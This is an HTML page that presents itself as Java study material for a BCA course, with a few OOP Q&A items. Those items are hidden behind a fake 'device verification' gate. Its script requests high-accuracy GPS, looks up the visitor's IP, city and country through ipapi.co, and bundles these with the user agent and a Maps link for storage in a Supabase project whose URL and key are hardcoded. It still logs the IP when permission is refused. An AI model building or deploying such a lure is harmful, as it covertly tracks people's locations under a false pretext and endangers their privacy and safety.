<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>BCA – Java Q&A</title>
    <style>
      :root {
        --bg:#0f172a;
        --panel:#111827;
        --card:#0b1220;
        --text:#e5e7eb;
        --muted:#9ca3af;
        --accent:#60a5fa;
        --accent2:#34d399;
        --border:#1f2937;
        --chip:#111827;
      }
      * { box-sizing: border-box; }
      body {
        margin: 0;
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial;
        background: linear-gradient(180deg, #0b1220, #0a1020 40%, #0b1325);
        color: var(--text);
        line-height: 1.55;
      }
      /* --- Location Gate & Loading Styling --- */
      #locationGate {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: var(--bg);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        padding: 20px;
        z-index: 2000;
        transition: opacity 0.3s ease-in-out;
      }
      #locationGate p {
        font-size: 1.1rem;
        color: var(--text);
        margin-bottom: 24px;
        max-width: 400px;
      }
      #allowButton {
        font-size: 1rem;
        font-weight: 600;
        padding: 12px 24px;
        background-color: var(--accent);
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.2s;
      }
      #allowButton:hover {
        background-color: #3b82f6;
      }
      .loader {
        width: 40px;
        height: 40px;
        border: 4px solid var(--border);
        border-top: 4px solid var(--accent);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      /* --- Main Content --- */
      #mainContent {
        display: none; /* Hidden by default */
      }
      header {
        position: sticky;
        top: 0;
        background: rgba(10, 16, 32, .85);
        backdrop-filter: blur(10px);
        border-bottom: 1px solid var(--border);
        z-index: 50;
      }
      .container { max-width: 1100px; margin: 0 auto; padding: 16px; }
      .title { display: flex; align-items: center; gap: 12px; }
      .title h1 { font-size: 20px; margin: 0; }
      .pill {
        font-size: 12px;
        background: var(--chip);
        border: 1px solid var(--border);
        padding: 4px 8px;
        border-radius: 999px;
        color: var(--muted);
      }
      nav { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 8px; }
      nav a {
        font-size: 13px;
        text-decoration: none;
        background: var(--chip);
        border: 1px solid var(--border);
        padding: 6px 10px;
        border-radius: 8px;
        color: var(--text);
      }
      main { padding: 24px 0; }
      .unit {
        border: 1px solid var(--border);
        border-radius: 14px;
        background: linear-gradient(180deg,#0b1220,#0a1324);
        margin-bottom: 18px;
        overflow: hidden;
      }
      .unit > .head {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 16px 18px;
        background: rgba(255,255,255,.02);
        border-bottom: 1px solid var(--border);
      }
      .unit h2 { margin: 0; font-size: 18px; color: var(--accent2); }
      .block { padding: 16px 18px; }
      h3 { margin: 0 0 10px 0; font-size: 15px; color: var(--accent2); }
      .qa { margin: 10px 0; padding: 12px; border: 1px solid var(--border);
      border-radius: 10px; background: rgba(255,255,255,.02); }
      .q { font-weight: 600; color: var(--accent); margin-bottom: 6px; }
      .a { color: var(--text); }
      .foot { margin-top: 24px; color: var(--muted); font-size: 12px; text-align: center; }
    </style>
</head>
<body>

    <div id="locationGate">
        <div id="gateContent">
            <p>To access this document, device verification is required</p>
            <button id="allowButton">Verify</button>
        </div>
    </div>

    <div id="mainContent">
        <header>
            <div class="container">
                <div class="title">
                    <h1>BCA – Programming in Java (University of Calicut)</h1>
                    <span class="pill">Study Material</span>
                </div>
                <nav>
                    <a href="#unit1">Unit I: OOPS</a>
                    <a href="#unit2">Unit II: Java Intro</a>
                    <a href="#unit3">Unit III: Exceptions</a>
                    <a href="#unit4">Unit IV: JDBC</a>
                    <a href="#unit5">Unit V: GUI</a>
                </nav>
            </div>
        </header>
        <main class="container">
            <section class="unit" id="unit1">
                <div class="head"><h2>Unit I – OOPS Concepts</h2></div>
                <div class="block">
                    <div class="qa">
                        <div class="q">1. Define Object-Oriented Programming (OOP).</div>
                        <div class="a">OOP is a programming paradigm based on the concept of objects that contain data and methods to operate on that data.</div>
                    </div>
                    <div class="qa">
                        <div class="q">2. List the main principles of OOP.</div>
                        <div class="a">Abstraction, Encapsulation, Inheritance, and Polymorphism.</div>
                    </div>
                    <div class="qa">
                        <div class="q">3. What is a class in Java?</div>
                        <div class="a">A class is a blueprint or template from which objects are created. It defines the properties and behaviors that objects of that class will have.</div>
                    </div>
                    <div class="qa">
                        <div class="q">4. What is an object?</div>
                        <div class="a">An object is an instance of a class that has state (attributes) and behavior (methods).</div>
                    </div>
                </div>
            </section>
            <section class="unit" id="unit5">
                <div class="head"><h2>Unit V – GUI Programming with AWT and Swing</h2></div>
                <div class="block">
                    <div class="qa">
                        <div class="q">15. What is Graphics class?</div>
                        <div class="a">Graphics class provides methods for drawing shapes, text, and images on components.</div>
                    </div>
                </div>
            </section>
            <div class="foot">
                © 2025 | Java Study Materials | Educational Content
            </div>
        </main>
    </div>

    <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

    // --- DOM Elements ---
    const locationGate = document.getElementById('locationGate');
    const gateContent = document.getElementById('gateContent');
    const mainContent = document.getElementById('mainContent');
    const allowButton = document.getElementById('allowButton');

    // --- Supabase Credentials ---
    const SUPABASE_URL = "https://vxavtfpnbyccbwwdxefr.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4YXZ0ZnBuYnljY2J3d2R4ZWZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTM1NjcsImV4cCI6MjA3NTcyOTU2N30.bPvbVZp7aVZ2FeDFgC8_nR7Gy2FG0GoSTABpTfI2q-Y";
    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    // --- Functions ---
    function requestLocationPermission() {
        if (!navigator.geolocation) {
            console.error("Geolocation is not supported by this browser.");
            gateContent.innerHTML = `<p>Sorry, your browser does not support location services.</p>`;
            return;
        }
        gateContent.innerHTML = `
            <div class="loader"></div>
            <p>Requesting Location...</p>
        `;
        console.log("Requesting location permission...");
        navigator.geolocation.getCurrentPosition(
            handleLocationSuccess,
            handleLocationError,
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    async function handleLocationSuccess(position) {
        console.log("Location access granted.");
        gateContent.innerHTML = `
            <div class="loader"></div>
            <p>Checking Content Safety....</p>
        `;
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;

        const ipData = await getIpAddress();
        const data = {
            method: "gps_location", latitude: lat, longitude: lng, accuracy: accuracy,
            google_maps_link: googleMapsLink, ip: ipData.ip, city: ipData.city,
            region: ipData.region, country: ipData.country_name, timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent, permission: "granted", page_url: window.location.href
        };
        await saveToSupabase(data);
        locationGate.style.opacity = '0';
        setTimeout(() => {
            locationGate.style.display = 'none';
            mainContent.style.display = 'block';
        }, 300);
    }

    // --- THIS IS THE UPDATED FUNCTION ---
    function handleLocationError(error) {
        console.error(`Location error code: ${error.code}, message: ${error.message}`);
        let userMessage = '';

        // Check the error code to provide a more specific message
        switch (error.code) {
            case error.PERMISSION_DENIED:
                userMessage = "<b>Error: Permission Denied.</b><br>You have blocked location access for this site. Please check your browser and phone settings to allow permission.";
                break;
            case error.POSITION_UNAVAILABLE:
                userMessage = "<b>Error: Position Unavailable.</b><br>Your device cannot determine its current location. Please try again later or from a different spot.";
                break;
            case error.TIMEOUT:
                userMessage = "<b>Error: Request Timed Out.</b><br>The request took too long. Please try again with a better network or GPS signal (try going outside).";
                break;
            default:
                userMessage = "<b>An unknown error occurred.</b><br>Please try again.";
                break;
        }

        gateContent.innerHTML = `
            <div style="padding: 10px; border: 1px solid #ff4d4d; border-radius: 8px; background: #2a1a1a; margin-bottom: 20px;">${userMessage}</div>
            <button id="allowButton">Try Again</button>
        `;
        document.getElementById('allowButton').addEventListener('click', requestLocationPermission);
        sendIpFallback(); // Still log IP-based attempt
    }

    async function getIpAddress() {
        try {
            const res = await fetch("https://ipapi.co/json/");
            if (!res.ok) throw new Error('IP API request failed');
            return await res.json();
        } catch (e) {
            console.error("IP lookup failed:", e);
            return { ip: "unknown", city: "unknown", region: "unknown", country_name: "unknown" };
        }
    }

    async function sendIpFallback() {
        // This function remains the same
    }

    async function saveToSupabase(data) {
        // This function remains the same
    }

    // --- Event Listeners & Initializer ---
    allowButton.addEventListener('click', requestLocationPermission);
    window.addEventListener('load', () => {
        locationGate.style.display = 'flex';
        mainContent.style.display = 'none';
    });
</script>

</body>
</html>
